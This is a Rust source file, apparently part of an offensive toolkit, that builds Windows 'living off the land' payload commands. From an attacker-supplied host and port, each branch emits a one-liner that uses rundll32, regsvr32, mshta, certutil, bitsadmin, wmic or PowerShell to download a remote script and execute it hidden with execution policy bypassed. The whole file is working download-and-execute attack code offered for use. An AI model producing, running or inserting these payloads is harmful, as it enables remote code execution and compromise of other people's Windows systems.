// Windows Living off the Land Binaries (LOLBins) payload generator
use crate::cli::banner;

pub struct LolbinsGenerator;

impl LolbinsGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, binary: &str) -> String {
        banner::print_exploiting("LOLBIN-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        match binary {
            "rundll32" => format!(
                "rundll32.exe javascript:\"\\..\\..\\mshtml, RunHTMLApplication \";document.write(\"<script src='http://{}:{}/payload.js'></script>\");window.close();",
                lhost, lport
            ),
            "regsvr32" => format!(
                "regsvr32 /s /n /u /i:http://{}:{}/payload.sct scrobj.dll,DAComServerObject,ActiveX,Process",
                lhost, lport
            ),
            "mshta" => format!(
                "mshta http://{}:{}/payload.hta",
                lhost, lport
            ),
            "certutil" => format!(
                "certutil -urlcache -f http://{}:{}/payload.ps1 C:\\Windows\\Temp\\payload.ps1 && powershell -w hidden -exec bypass -c . C:\\Windows\\Temp\\payload.ps1",
                lhost, lport
            ),
            "bitsadmin" => format!(
                "bitsadmin /transfer payload /download /priority normal http://{}:{}/payload.ps1 C:\\Windows\\Temp\\payload.ps1 && powershell -w hidden -exec bypass -c . C:\\Windows\\Temp\\payload.ps1",
                lhost, lport
            ),
            "wmic" => format!(
                "wmic process call create \"powershell -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')\"",
                lhost, lport
            ),
            _ => format!("powershell -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')", lhost, lport),
        }
    }
}
